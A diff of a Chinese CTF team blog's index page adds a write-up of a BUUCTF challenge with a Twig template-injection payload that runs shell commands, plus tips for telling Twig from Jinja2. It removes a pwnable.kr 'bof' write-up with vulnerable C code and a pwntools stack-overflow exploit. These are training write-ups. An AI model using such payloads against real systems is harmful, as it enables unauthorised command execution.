@@ -163,7 +163,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -197,6 +197,131 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/08/12/buuctf_[BJDCTF2020]CookieIsSoStable/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/" class="post-title-link" itemprop="url">BUUCTF [BJDCTF2020]Cookie is so stable</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-08-12 22:52:00 / 修改时间：22:52:43" itemprop="dateCreated datePublished" datetime="2022-08-12T22:52:00+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/web%E9%A2%98%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">web题集</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="BUUCTF-BJDCTF2020-Cookie-is-so-stable"><a href="#BUUCTF-BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BUUCTF [BJDCTF2020]Cookie is so stable"></a>BUUCTF [BJDCTF2020]Cookie is so stable</h1><p><strong>这是一道关于php的SSTI注入</strong></p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175404154.png" class="" title="image-20220811175404154">
+
+<p>这是检测ssti的一张思路图看不懂的小伙伴后面会有详解不要慌张；</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>从题目看出这题应该解题的关键在于cookie</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175546406.png" class="" title="image-20220811175546406">
+
+<p>查看提示（hint下f12）</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175641303.png" class="" title="image-20220811175641303">
+
+<p>用bp抓包查看，发现在输入id登陆后cookie中出现了一个可控变量user</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175951417.png" class="" title="image-20220811175951417">
+
+<p>所以猜想后端接受到user输入后在进行输出类似一个模板所以想到了ssti注入（非官方思路猜想）</p>
+<p>之后根据测试图测试发现是Twig模板</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180220745.png" class="" title="image-20220811180220745">
+
+
+
+
+
+
+
+
+
+<h1 id="关于模板判断的方法及回显"><a href="#关于模板判断的方法及回显" class="headerlink" title="关于模板判断的方法及回显"></a>关于模板判断的方法及回显</h1><p>首先利用${7*7}进行测试，我们发现在页面上未进行一个算数运算，所以往下走</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180358818.png" class="" title="image-20220811180358818">
+
+<p>利用49测试</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180633572.png" class="" title="image-20220811180633572">
+
+<p>发现这里发生了运算，也就是图中下路中间部分的情况，这时候就要判断它是twig，还是jinja2</p>
+<p>也就是利用49</p>
+<p>如果是twig则返回结果应该是计算后的结果，反之亦然；</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180341890.png" class="" title="image-20220811180341890">
+
+<p>jinja2下测试49回显如下</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811181059123.png" class="" title="image-20220811181059123">
+
+<p>（场景来源bugku-Simple_SSTI_1）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1518,98 +1643,6 @@
 
 <h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
 <img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2022/07/12/bof(wp)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="nnnpc、commit、Eureka">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R3ape1团队笔记">
-      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | R3ape1团队笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/07/12/bof(wp)/" class="post-title-link" itemprop="url">bof</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-07-12 19:46:00 / 修改时间：19:46:37" itemprop="dateCreated datePublished" datetime="2022-07-12T19:46:00+08:00">2022-07-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
-<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
-
-<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
